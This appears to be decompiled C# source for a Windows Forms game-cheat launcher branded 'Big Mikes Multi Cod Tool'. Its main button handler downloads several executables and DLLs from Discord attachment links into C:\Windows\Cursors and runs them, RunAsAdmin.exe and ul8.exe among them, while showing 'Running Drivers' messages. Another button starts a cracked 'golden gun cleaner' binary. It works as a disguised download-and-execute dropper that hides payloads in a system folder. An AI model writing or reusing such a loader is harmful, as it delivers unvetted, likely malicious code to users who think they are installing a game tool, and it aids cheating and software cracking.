using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace KeyAuth
{
	// Token: 0x02000004 RID: 4
	public partial class Main : Form
	{
		// Token: 0x0600001A RID: 26
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x0600001B RID: 27 RVA: 0x00002232 File Offset: 0x00000432
		public Main()
		{
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.None;
			base.Region = Region.FromHrgn(Main.CreateRoundRectRgn(0, 0, base.Width, base.Height, 20, 20));
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002269 File Offset: 0x00000469
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002271 File Offset: 0x00000471
		private void Main_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000023EC File Offset: 0x000005EC
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002420 File Offset: 0x00000620
		private void siticoneGradientButton1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("Launching Big Mikes Multi Cod Tool.");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/933962863117226015/944432336429269032/Newtonsoft.Json.dll", "C:\\Windows\\Cursors\\Newtonsoft.Json.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/933962863117226015/944432333421965363/ReaLTaiizor.dll", "C:\\Windows\\Cursors\\ReaLTaiizor.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/933962863117226015/944432334910922762/System.Diagnostics.EventLog.dll", "C:\\Windows\\Cursors\\System.Diagnostics.EventLog.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/933962863117226015/944432335108059206/System.Security.Principal.Windows.dll", "C:\\Windows\\Cursors\\System.Security.Principal.Windows.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/933962863117226015/944432335464562778/System.ServiceProcess.ServiceController.dll", "C:\\Windows\\Cursors\\System.ServiceProcess.ServiceController.dll");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/686016920486412314/954774463419924550/ul8.exe", "C:\\Windows\\Cursors\\ul8.exe");
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/933962863117226015/944432334193721344/RunAsAdmin.exe", "C:\\Windows\\Cursors\\RunAsAdmin.exe");
			Process.Start("C:\\Windows\\Cursors\\RunAsAdmin.exe");
			MessageBox.Show("Running Drivers..", "Please Wait, Loading..", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			Thread.Sleep(13000);
			Process.Start("C:\\Windows\\Cursors\\ul8.exe");
			MessageBox.Show("Drivers Success!", "Successfully loaded!");
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002273 File Offset: 0x00000473
		private void siticoneGradientButton2_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/zg3g7z4q68 ");
			MessageBox.Show("Successfully Joined Discord", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002293 File Offset: 0x00000493
		private void siticoneGradientButton3_Click(object sender, EventArgs e)
		{
			Process.Start("C:\\Windows\\Cursors\\CRACKED_GOLDEN_GUN_CLEANER.exe");
			MessageBox.Show("Project Golden Now Loading..", "Please Wait, Loading..", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002271 File Offset: 0x00000471
		private void expiry_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00002271 File Offset: 0x00000471
		private void numUsers_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000022B3 File Offset: 0x000004B3
		private void siticoneGradientButton4_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UC9uF6zo_m1aFPZYgkoBaj8A");
			MessageBox.Show("Successfully Loaded Youtube", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000022D3 File Offset: 0x000004D3
		private void siticoneGradientButton5_Click(object sender, EventArgs e)
		{
			Process.Start("https://cdn.discordapp.com/attachments/935253539503099964/947582930920808509/AOC_UNLOCKER_INSTRUCTIONS.txt");
			MessageBox.Show("Successfully Loaded Instructions", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002271 File Offset: 0x00000471
		private void panel5_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002271 File Offset: 0x00000471
		private void siticoneControlBox2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002271 File Offset: 0x00000471
		private void sidebar_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002271 File Offset: 0x00000471
		private void label2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00002271 File Offset: 0x00000471
		private void label7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002271 File Offset: 0x00000471
		private void label6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002271 File Offset: 0x00000471
		private void label5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002271 File Offset: 0x00000471
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002271 File Offset: 0x00000471
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}
	}
}
